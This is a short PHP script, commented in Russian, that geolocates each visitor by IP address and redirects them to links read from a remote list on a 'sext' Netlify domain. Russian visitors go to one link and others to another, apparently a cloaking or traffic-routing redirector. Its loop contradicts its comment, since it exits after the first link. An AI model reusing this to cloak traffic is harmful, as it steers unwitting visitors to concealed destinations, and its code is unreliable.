<?php
// Функция для отправки запросов к API сервиса геолокации
function getCountryByIP($ip) {
    $url = "https://ipinfo.io/$ip/country";
    $response = file_get_contents($url);
    return $response;
}

// Получение IP-адреса пользователя
$ip = $_SERVER['REMOTE_ADDR'];

// Определение страны пользователя по IP-адресу
$country = getCountryByIP($ip);

// Если пользователь из России, редиректим по первым 3 ссылкам
if ($country == "RU") {
    $lines = file("https://sext.netlify.app/links.txt");
    for ($i = 0; $i < 3; $i++) {
        header("Location: " . trim($lines[$i]));
        exit; // Останавливаем выполнение скрипта после редиректа
    }
}
// Иначе редиректим на четвертую ссылку
else {
    $lines = file("https://sext.netlify.app/links.txt");
    header("Location: " . trim($lines[3]));
    exit; // Останавливаем выполнение скрипта после редиректа
}
?>
